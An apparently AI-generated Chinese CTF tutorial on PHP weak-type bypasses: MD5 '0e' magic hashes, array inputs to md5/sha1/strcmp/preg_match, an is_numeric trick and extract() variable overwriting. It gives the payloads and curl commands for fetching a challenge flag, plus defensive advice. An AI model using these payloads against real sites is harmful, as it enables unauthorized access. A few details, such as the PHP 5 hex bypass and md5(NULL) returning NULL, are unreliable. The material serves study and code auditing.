---
AIGC:
  ContentProducer: '001191110102MAD55U9H0F10002'
  ContentPropagator: '001191110102MAD55U9H0F10002'
  Label: '1'
  ProduceID: 'ad21ddfe-2eaf-4e63-89e2-3096702bea32'
  PropagateID: 'ad21ddfe-2eaf-4e63-89e2-3096702bea32'
  ReservedCode1: 'de25bc77-7ee1-49a8-a8b6-0e232d063656'
  ReservedCode2: 'de25bc77-7ee1-49a8-a8b6-0e232d063656'
---

# CTF Web 知识点专题 — PHP 弱类型与安全绕过

> **CTF 竞赛 Web 方向考点**：本专题系统整理 PHP 弱类型机制及其在 CTF 竞赛中的绕过技巧，所有内容面向竞赛学习与代码审计参考。

## 1. 概述

PHP 是弱类型语言，变量类型在运行时动态推断。这种灵活性在正常开发中带来便利，但也产生了大量可被利用的安全特性。CTF 竞赛中，PHP 弱类型绕过是 Web 方向的核心考点之一，常见于代码审计题的多阶段验证场景。

本专题以一道典型五关卡题目为线索，系统覆盖以下考点：

| 关卡 | 考点 | 核心函数 |
|------|------|---------|
| Level 1 | MD5 弱比较绕过（`==`） | `md5()` + `==` |
| Level 2 | MD5/SHA1 严格比较绕过（`===`） | `md5()` + `sha1()` + `===` |
| Level 3 | strcmp 数组绕过 | `strcmp()` |
| Level 4 | is_numeric 绕过 | `is_numeric()` |
| Level 5 | extract 变量覆盖 + preg_match 数组绕过 | `extract()` + `preg_match()` |

---

## 2. Level 1 — MD5 弱比较绕过（`==`）

### 2.1 题目代码

```php
if($_GET['key1'] !== $_GET['key2'] && md5($_GET['key1']) == md5($_GET['key2'])){
    $flag1 = True;
}
```

### 2.2 考点分析

条件要求两个不同的输入，但它们的 MD5 哈希值在弱比较（`==`）下相等。

PHP 弱比较 `==` 的核心规则：**当两个字符串以 `0e` 开头且后续全为数字时，PHP 会将它们解析为科学计数法，即 `0 × 10^N = 0`**。因此两个不同字符串只要 MD5 值都是 `0e` 开头的纯数字形式，`==` 比较就返回 `true`。

### 2.3 利用方法

#### 方法一：0e 碰撞（科学计数法绕过）

使用已知的 MD5 以 `0e` 开头的字符串：

| 原始字符串 | MD5 值 |
|-----------|---------|
| `QNKCDZO` | `0e830400451993494058024219903391` |
| `240610708` | `0e462097431906509019562988736854` |
| `s878926199a` | `0e545993274517709034328855841020` |
| `s155964671a` | `0e342768416822451524974117254469` |
| `s214587387a` | `0e848240448830537924465896641784` |

```
GET /?key1=QNKCDZO&key2=240610708
```

#### 方法二：数组绕过

`md5()` 接收数组参数时返回 `NULL`，而 `NULL == NULL` 为 `true`：

```
GET /?key1[]=1&key2[]=2
```

- `$_GET['key1']` = `[1]`，`$_GET['key2']` = `[2]` → 不同数组，`!==` 成立
- `md5([1])` = `NULL`，`md5([2])` = `NULL` → `NULL == NULL` 为 `true`

### 2.4 原理总结

```
弱比较 == 的类型转换规则：
  字符串 vs 字符串 → 如果双方都是数字字符串，按数值比较
  "0e123" == "0e456" → 0 == 0 → true
  NULL == NULL → true

强比较 === 的规则：
  不做类型转换，类型和值都必须完全相同
```

---

## 3. Level 2 — MD5/SHA1 严格比较绕过（`===`）

### 3.1 题目代码

```php
if(isset($_POST['key3'])){
    if(md5($_POST['key3']) === sha1($_POST['key3'])){
        $flag2 = True;
    }
}
```

### 3.2 考点分析

这里用的是严格比较 `===`，要求 `md5()` 返回值与 `sha1()` 返回值在类型和值上完全相同。

0e 碰撞不再适用，因为 `===` 不做类型转换，两个不同字符串的 MD5 不可能 `===` 相等。但数组绕过依然有效：

- `md5(数组)` → 返回 `NULL`
- `sha1(数组)` → 返回 `NULL`
- `NULL === NULL` → `true`

### 3.3 利用方法

```
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded

key3[]=1
```

`$_POST['key3']` 为数组 `['1']`：
- `md5(['1'])` → `NULL`
- `sha1(['1'])` → `NULL`
- `NULL === NULL` → `true` ✓

### 3.4 补充：md5/sha1 对数组的处理

```
函数        正常输入（字符串）      数组输入
md5()       返回 32 位 hex 字符串   返回 NULL，并产生 Warning
sha1()      返回 40 位 hex 字符串   返回 NULL，并产生 Warning
```

### 3.5 注意事项

- POST 数组请求必须携带 `Content-Type: application/x-www-form-urlencoded` 头，否则 PHP 不解析 POST body，`$_POST` 为空
- `error_reporting(0)` 会屏蔽 Warning，页面不会显示错误信息

---

## 4. Level 3 — strcmp 数组绕过

### 4.1 题目代码

```php
if(isset($_GET['key4'])){
    if(strcmp($_GET['key4'], file_get_contents("/flag")) == 0){
        $flag3 = True;
    }
}
```

### 4.2 考点分析

`strcmp($str1, $str2)` 比较两个字符串：
- 返回 `0` 表示相等
- 返回 `< 0` 表示 str1 < str2
- 返回 `> 0` 表示 str1 > str2

题目用 `strcmp(...) == 0` 判断是否相等。由于不知道 `/flag` 的内容，正常比较无法构造匹配值。

但 `strcmp()` 接收数组参数时返回 `NULL`，而 `NULL == 0` 在弱比较下为 `true`。

### 4.3 利用方法

```
GET /?key4[]=1
```

`$_GET['key4']` 为数组 `['1']`：
- `strcmp(['1'], "/flag内容")` → `NULL`
- `NULL == 0` → `true` ✓

### 4.4 原理总结

```
strcmp 的返回值：
  字符串 vs 字符串 → int（0 / 正数 / 负数）
  数组 vs 任意     → NULL + Warning

弱比较 == 中：
  NULL == 0    → true
  NULL == "0"  → true
  NULL == false → true
```

### 4.5 延伸：其他可被数组绕过的函数

| 函数 | 正常返回 | 数组返回 | 绕过条件 |
|------|---------|---------|---------|
| `strcmp()` | int | NULL | `== 0` |
| `md5()` | string | NULL | `== 或 ===` |
| `sha1()` | string | NULL | `== 或 ===` |
| `preg_match()` | int (0/1) | false | `== false 或 === false` |
| `strpos()` | int/false | false | `=== false` |

---

## 5. Level 4 — is_numeric 绕过

### 5.1 题目代码

```php
if(isset($_GET['key5'])){
    if(!is_numeric($_GET['key5']) && $_GET['key5'] > 2023){
        $flag4 = True;
    }
}
```

### 5.2 考点分析

要求 `key5` **不是纯数字**，但**大于 2023**。

`is_numeric()` 检查变量是否为数字或数字字符串，返回 `true` 的情况：
- 整数：`123`
- 浮点数：`1.23`
- 科学计数法：`1e5`
- 带正负号：`+123`, `-45.6`
- 十六进制（PHP 7 之前）：`0x1A`

### 5.3 利用方法

#### 方法一：数字 + 空字符绕过

PHP 弱比较中，字符串在与数字比较时会取**前导数字部分**进行数值比较。在数字后面附加非数字字符即可绕过 `is_numeric()`：

```
GET /?key5=2024a
```

- `is_numeric("2024a")` → `false`（不是纯数字）✓
- `"2024a" > 2023` → PHP 取前导数字 `2024`，`2024 > 2023` → `true` ✓

#### 方法二：十六进制绕过（PHP < 7）

PHP 5 中 `is_numeric()` 接受十六进制字符串，但弱比较时十六进制字符串作为字符串处理：

```
GET /?key5=0x1234
```

### 5.4 原理总结

```
is_numeric() 判定为 true 的格式：
  "123"   → true
  "1.23"  → true
  "1e5"   → true
  "+123"  → true
  "2024a" → false  ← 用于绕过

弱比较时的类型转换：
  "2024a" > 2023  →  2024 > 2023  →  true
  "abc"   > 2023  →  0 > 2023     →  false
  "1e5"   > 2023  →  100000 > 2023 → true（但 is_numeric 为 true，不能用于本关）
```

### 5.5 PHP 版本差异

| 特性 | PHP 5.x | PHP 7.x+ |
|------|---------|----------|
| 十六进制 `0x1A` | `is_numeric` = true | `is_numeric` = false |
| `"0x1A" == 26` | true | false |
| 科学计数法 `1e5` | 支持 | 支持 |

---

## 6. Level 5 — extract 变量覆盖 + preg_match 数组绕过

### 6.1 题目代码

```php
extract($_POST);
foreach($_POST as $var){
    if(preg_match("/[a-zA-Z0-9]/", $var)){
        die("nope,this is level 5");
    }
}
if($flag5){
    echo file_get_contents("/flag");
}
```

### 6.2 考点分析

本关综合了两个考点：

1. **`extract()` 变量覆盖**：`extract($_POST)` 将所有 POST 参数直接导入当前作用域作为变量。传入 `flag5=xxx` 就会创建 `$flag5 = "xxx"`。

2. **`preg_match()` 数组绕过**：`foreach` 遍历所有 POST 值，对每个值执行 `preg_match("/[a-zA-Z0-9]/", $var)`，任何值包含字母或数字就 `die()`。

挑战在于：`$flag5` 需要为 truthy 值，但其对应的 POST 值不能包含任何字母数字。

### 6.3 利用方法

```
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded

flag5[]=
```

`$_POST['flag5']` 为数组 `['']`：

- `extract()` 后 `$flag5` = `['']`（非空数组 → truthy）
- `foreach` 中 `preg_match("/[a-zA-Z0-9]/", [''])` → `false`（`preg_match` 对数组参数返回 `false`，不触发 `die`）
- `if($flag5)` → 非空数组为 truthy → `true` ✓
- 输出 `file_get_contents("/flag")`

### 6.4 原理拆解

#### extract() 的行为

```php
// 输入: POST flag5[]=-
// $_POST = ['flag5' => ['']]

extract($_POST);
// 等价于: $flag5 = [''];

// $flag5 是非空数组，在 if 判断中为 true
```

#### preg_match() 对数组的处理

```
preg_match("/[a-zA-Z0-9]/", "abc")  → int(1)  匹配成功
preg_match("/[a-zA-Z0-9]/", "!!!")  → int(0)  未匹配
preg_match("/[a-zA-Z0-9]/", [''])   → false   参数类型错误
```

`preg_match` 要求第二个参数为字符串。传入数组时返回 `false`，不触发 `die()`。

#### truthy 判断规则

```
PHP 中以下值在 if 判断中为 false：
  false, 0, 0.0, "", "0", [], null

非空数组 [''] 为 true（数组中有一个元素，即使元素本身为空字符串）
```

### 6.5 变量覆盖风险扩展

`extract()` 的危险不仅在于本关的简单覆盖，还可用于覆盖已有变量：

```php
// 危险示例
$secret = "hardcoded_value";
extract($_POST);
// 攻击者传入 secret=anything，$secret 被覆盖

// 安全做法：指定 EXTR_SKIP 参数
extract($_POST, EXTR_SKIP);  // 不覆盖已有变量
```

`extract()` 参数说明：

| 常量 | 行为 |
|------|------|
| `EXTR_OVERWRITE`（默认） | 覆盖已有变量 |
| `EXTR_SKIP` | 不覆盖已有变量 |
| `EXTR_PREFIX_SAME` | 加前缀 |
| `EXTR_PREFIX_ALL` | 所有变量加前缀 |

---

## 7. 完整解题流程

```bash
# Level 1: MD5 弱比较 — 0e 碰撞
curl "http://target/?key1=QNKCDZO&key2=240610708"

# Level 2: MD5/SHA1 严格比较 — 数组绕过（POST）
curl -X POST "http://target/" \
  -d "key3[]=1"
# 注意: 必须带 Content-Type，curl -d 自动添加

# Level 3: strcmp — 数组绕过（GET）
# Level 1-3 均在 URL 参数中传递
curl "http://target/?key1=QNKCDZO&key2=240610708&key4[]=1"

# Level 4: is_numeric — 数字+字符绕过
curl "http://target/?key1=QNKCDZO&key2=240610708&key4[]=1&key5=2024a"

# Level 5: extract + preg_match — 数组绕过（POST）
# Level 2 和 Level 5 都是 POST，合并发送
curl -X POST "http://target/?key1=QNKCDZO&key2=240610708&key4[]=1&key5=2024a" \
  -d "key3[]=1&flag5[]="
```

### 解题流程图

```
Level 1 (GET)  key1=QNKCDZO & key2=240610708    → MD5 0e碰撞
    ↓
Level 2 (POST) key3[]=1                          → md5(数组)=NULL === sha1(数组)=NULL
    ↓
Level 3 (GET)  key4[]=1                          → strcmp(数组,NULL)=NULL == 0
    ↓
Level 4 (GET)  key5=2024a                        → !is_numeric && 弱比较>2023
    ↓
Level 5 (POST) flag5[]=                          → extract覆盖 + preg_match数组绕过 + truthy数组
    ↓
输出 /flag
```

---

## 8. PHP 弱类型比较速查表

### 8.1 弱比较 `==` 常见陷阱

| 比较 | 结果 | 原因 |
|------|------|------|
| `"0e123" == "0e456"` | `true` | 科学计数法 0 == 0 |
| `"abc" == 0` | `true` | 字符串转 int，非数字开头为 0 |
| `"1abc" == 1` | `true` | 取前导数字 1 |
| `null == false` | `true` | null 转换为 false |
| `null == 0` | `true` | null 转换为 0 |
| `"" == 0` | `true`（PHP 7 以下） | 空字符串转换为 0 |
| `"" == 0` | `false`（PHP 8+） | PHP 8 改变了字符串与数字比较规则 |
| `"0" == false` | `true` | "0" 转换为 false |
| `[] == false` | `true` | 空数组转 false |
| `[""] == false` | `false` | 非空数组转 true |

### 8.2 函数对非预期类型的返回值

| 函数 | 字符串输入 | 数组输入 | NULL 输入 |
|------|-----------|---------|---------|
| `md5()` | 32 位 hex | `NULL` + Warning | `NULL` |
| `sha1()` | 40 位 hex | `NULL` + Warning | `NULL` |
| `strcmp()` | int | `NULL` + Warning | `NULL` + Warning |
| `preg_match()` | 0 或 1 | `false` + Warning | `false` + Warning |
| `is_numeric()` | bool | `false` | `false` |
| `strlen()` | int | `NULL` + Warning | `0` |

### 8.3 PHP 版本差异要点

| 特性 | PHP 5.x | PHP 7.x | PHP 8.x |
|------|---------|---------|---------|
| `"0e123" == "0e456"` | `true` | `true` | `true` |
| `"" == 0` | `true` | `true` | `false` |
| `"abc" == 0` | `true` | `true` | `false` |
| 十六进制字符串 `0x1A` 参与比较 | 按 16 进制 | 按字符串 | 按字符串 |
| `is_numeric("0x1A")` | `true` | `false` | `false` |

---

## 9. 防御建议

| 考点 | 防御方法 |
|------|---------|
| 弱比较 `==` | 始终使用 `===` 严格比较 |
| 函数接收数组 | 使用 `is_string()` 预检参数类型 |
| `extract()` | 避免使用，或指定 `EXTR_SKIP` 参数 |
| `is_numeric()` | 结合范围检查和类型验证 |
| `preg_match()` | 检查返回值是否为 `false`（错误）而非仅 `0`（未匹配） |

---

## 10. 参考

- [PHP 类型比较表 — 官方文档](https://www.php.net/manual/zh/types.comparisons.php)
- [PHP 弱类型安全 — 腾讯云开发者社区](https://cloud.tencent.com/developer/article/2127498)
- 本专题配套题目：DASCTF 五关卡 PHP 代码审计

> AI生成